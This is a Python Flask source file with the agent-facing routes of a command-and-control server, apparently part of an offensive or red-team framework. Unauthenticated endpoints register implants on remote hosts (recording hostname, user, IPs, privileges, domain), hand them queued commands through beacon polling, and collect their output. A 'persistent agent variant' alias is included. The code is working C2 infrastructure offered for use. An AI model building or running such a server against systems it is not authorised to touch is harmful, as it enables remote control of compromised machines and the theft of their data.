"""
C2 agent-facing routes — mounted on the main Flask app so they work even
without a separate listener thread running.

These are unauthenticated endpoints that agents talk to:
  POST /api/c2/checkin   — registration
  POST /api/c2/beacon    — poll for tasks
  POST /api/c2/result    — submit task output
"""

import json
import logging
import uuid
from datetime import datetime, timezone

from flask import Blueprint, request, jsonify

from models import db, Agent, AgentTask
from models import db, Agent, AgentTask, AuditLog

logger = logging.getLogger(__name__)
c2_bp = Blueprint('c2', __name__, url_prefix='/api/c2')

MAX_BODY = 50_000


def _utcnow():
    return datetime.now(timezone.utc)


def _parse_json():
    try:
        return request.get_json(silent=True) or {}
    except Exception:
        return {}


def _log_c2_activity(action, agent_id, details=None):
    """Log C2 activity to AuditLog for visibility."""
    entry = AuditLog(
        action=f"c2_{action}",
        target=agent_id,
        details=str(details)[:2000] if details else None,
        ip_address=request.remote_addr
    )
    db.session.add(entry)

# ── checkin ────────────────────────────────────────────────────────────────

@c2_bp.route('/checkin', methods=['POST'])
def checkin():
    """Agent registration / re-registration."""
    data = _parse_json()

    hostname = str(data.get('hostname', ''))[:256]
    username = str(data.get('username', data.get('user', '')))[:256]
    os_info = str(data.get('os', data.get('os_info', '')))[:512]
    internal_ip = str(data.get('ip', data.get('internal_ip', '')))[:45]
    external_ip = (request.remote_addr or '')[:45]

    # Smart dedup
    existing = Agent.query.filter_by(
        hostname=hostname, username=username, internal_ip=internal_ip
    ).first()

    now = _utcnow()

    if existing:
        existing.external_ip = external_ip
        existing.last_seen = now
        existing.status = 'active'
        if os_info:
            existing.os_info = os_info
        meta = {}
        try:
            meta = json.loads(existing.metadata_json) if existing.metadata_json else {}
        except (json.JSONDecodeError, TypeError):
            pass
        for k in ('pid', 'arch', 'domain', 'privileges'):
            if k in data:
                meta[k] = data[k]
        existing.metadata_json = json.dumps(meta, default=str)
        db.session.commit()
        _log_c2_activity('checkin_update', existing.id, f"User: {username} Host: {hostname}")
        return jsonify({
            'agent_id': existing.id,
            'sleep': existing.sleep_interval,
            'jitter': existing.jitter,
        }), 200

    agent_id = str(uuid.uuid4())
    agent = Agent(
        id=agent_id,
        hostname=hostname,
        username=username,
        os_info=os_info,
        internal_ip=internal_ip,
        external_ip=external_ip,
        status='active',
        first_seen=now,
        last_seen=now,
        metadata_json=json.dumps(
            {k: data[k] for k in ('pid', 'arch', 'domain', 'privileges') if k in data},
            default=str,
        ),
    )
    db.session.add(agent)
    db.session.commit()
    _log_c2_activity('checkin_new', agent_id, f"User: {username} Host: {hostname}")

    return jsonify({
        'agent_id': agent_id,
        'sleep': agent.sleep_interval,
        'jitter': agent.jitter,
    }), 200


# ── beacon ─────────────────────────────────────────────────────────────────

@c2_bp.route('/beacon', methods=['POST'])
def beacon():
    """Agent polls for pending tasks."""
    data = _parse_json()
    agent_id = str(data.get('agent_id', ''))[:36]

    if not agent_id:
        return jsonify({'error': 'agent_id required'}), 400

    agent = Agent.query.get(agent_id)
    if not agent:
        return jsonify({'error': 'unknown agent'}), 404

    agent.last_seen = _utcnow()
    agent.external_ip = (request.remote_addr or '')[:45]
    agent.status = 'active'

    tasks = (
        AgentTask.query
        .filter_by(agent_id=agent_id, status='queued')
        .order_by(AgentTask.created_at.asc())
        .all()
    )
    task_list = []
    for t in tasks:
        task_list.append({'id': t.id, 'command': t.command, 'type': t.task_type})
        t.status = 'sent'
        t.sent_at = _utcnow()

    db.session.commit()

    # Optional: Log beacon only if tasks were sent to reduce noise, or log verbose if needed
    if task_list:
        _log_c2_activity('beacon_tasks_sent', agent_id, f"Sent {len(task_list)} tasks")

    return jsonify({
        'tasks': task_list,
        'sleep': agent.sleep_interval,
        'jitter': agent.jitter,
    }), 200


# ── result ─────────────────────────────────────────────────────────────────

@c2_bp.route('/result', methods=['POST'])
def result():
    """Agent submits task execution results."""
    data = _parse_json()

    agent_id = str(data.get('agent_id', ''))[:36]
    task_id = str(data.get('task_id', ''))[:36]
    output = str(data.get('result', data.get('output', '')))[:MAX_BODY]
    success = data.get('success', True)

    if not agent_id or not task_id:
        return jsonify({'error': 'agent_id and task_id required'}), 400

    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = _utcnow()
        agent.status = 'active'

    task = AgentTask.query.get(task_id)
    if task and task.agent_id == agent_id:
        task.result = output
        task.success = bool(success)
        task.status = 'completed'
        task.completed_at = _utcnow()

    db.session.commit()
    _log_c2_activity('result', agent_id, f"Task {task_id} completed. Success: {success}")
    return jsonify({'status': 'ok'}), 200


# ── Alternative paths (persistent agent variant) ──────────────────────────

@c2_bp.route('/agents/register', methods=['POST'])
def register_alias():
    """Alias for /api/c2/checkin used by the persistent agent variant."""
    return checkin()
